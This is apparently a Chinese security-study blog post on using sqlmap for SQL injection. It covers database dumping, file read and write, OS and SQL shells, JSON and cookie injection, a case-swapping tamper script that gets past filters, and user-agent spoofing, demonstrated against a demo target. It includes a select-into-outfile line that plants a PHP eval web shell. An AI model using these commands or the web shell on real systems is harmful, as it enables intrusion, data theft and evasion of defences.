---
title: 注入工具&SQLMAP&Tamper编写&指纹修改&高权限操作&目录架构
published: 2025-11-15
description: sqlmap常用的命令。
tags: [WEB攻防,SQL注入]
category: 网络安全
draft: false
---

## 知识点

> 1. 注入工具-SQLMAP-常规猜解&字典配置
> 2. 注入工具-SQLMAP-权限操作&文件命令
> 3. 注入工具-SQLMAP-Tamper&使用&开发
> 4. 注入工具-SQLMAP-调试指纹&风险等级

## 数据猜解-库表列数据&字典

因为我个人平常使用的都是Kali中的Sqlmap，所以使用的相关内容可参考文章：https://www.cnblogs.com/nangongergou/p/17999044

案例中使用的测试方法为：

测试：http://vulnweb.com/

--current-db

--tables -D ""

--columns -T "" -D ""

--dump -C "" -T "" -D ""

其他命令可参考：https://www.cnblogs.com/bmjoker/p/9326258.html

## 权限操作-文件&命令&交互式

> 引出权限：
>
> --is-dba --privileges
>
> 引出文件：
>
> --file-read --file-write --file-dest 
>
> 引出命令：
>
> --os-cmd= --os-shell --sql-shell

测试：MYSQL高权限注入

查看权限是否是管理员：--is-dba

文件读写：--file-read(文件读取命令，相当于使用load_file函数)

**这两个命令一般一起使用：**

--file-write 写入本地文件 --file-dest  要写入的文件绝对路径

**上传一句话：**

```shell
--sql-shell(执行数据库命令，必须要用到select，也可以配合into outfile函数)
select "<?php @eval($_POST[1]);?>" into outfile "xxx/you.php";
```

## 提交方法-POST&HEAD&JSON

### Post方式注入

--data ""

![image-20251115114245759](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251115114245759.png)

### Cookie方式注入

--cookie ""

**建议用数据包方式进行注入，原因如下：**

> 有个网站只能手机访问 有个注入点
>
> 如果不是通过抓包得到的请求注入点数据包去注入的话
>
> sqlmap就会采用自己的访问头去访问注入（可能访问不到，访问不到还怎么注入？）

**又或者遇到json格式的数据，如果直接使用sqlmap的 --data ""是无法进行正常注入的，这时候就需要复制请求头，再把json格式的数据放到文件中，使用sqlmap进行-r即可。**

Json方式注入：-r 1.txt （推荐，该方法通杀全部提交方式）在txt里要注入的地方加上`*`号就是告诉工具在这里注入，不加`*`就是让工具对整个数据包参数进行测试。

![image-20251115114548168](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251115114548168.png)

## 绕过模块-Tamper脚本-使用&开发

### 案例1

![image-20251115133110884](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251115133110884.png)

可参考：https://www.cnblogs.com/bmjoker/p/9326258.html，以下为部分截图：

![image-20251115133133366](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251115133133366.png)

### 案例2

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/537bc97a680a2386f5eeaadc0c65e93d.png)

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/c987cd41a17555587fd249e49f9bee1b.png)

```python
--tamper=test.py  //简单绕过脚本
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW
def dependencies():
    pass
def tamper(payload, **kwargs):
    if payload:      
        payload = payload.replace('SELECT','sElEct')
        payload = payload.replace('OR','Or')
        payload = payload.replace('AND','And')
        payload = payload.replace('SLEEP','SleeP')
        payload = payload.replace('ELT','Elt')
    return payload
```

## 分析拓展-代理&调试&指纹&风险&等级

### 后期分析调试

-v=(0-6)  #详细的等级(0-6)

![image-20251115134643995](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/image-20251115134643995.png)

–proxy “http://xx:xx” #代理注入

### 打乱默认指纹

```python
--user-agent ""  #自定义user-agent
--random-agent   #随机user-agent
--delay (设定两个HTTP请求的间隔时间，默认是没有任何间隔)
```

### 使用更多的测试

测试Header注入

```python
--level=(1-5) #要执行的测试水平等级(测试深度)，默认为1 
--risk=(0-3)  #测试执行的风险等级，默认为1
```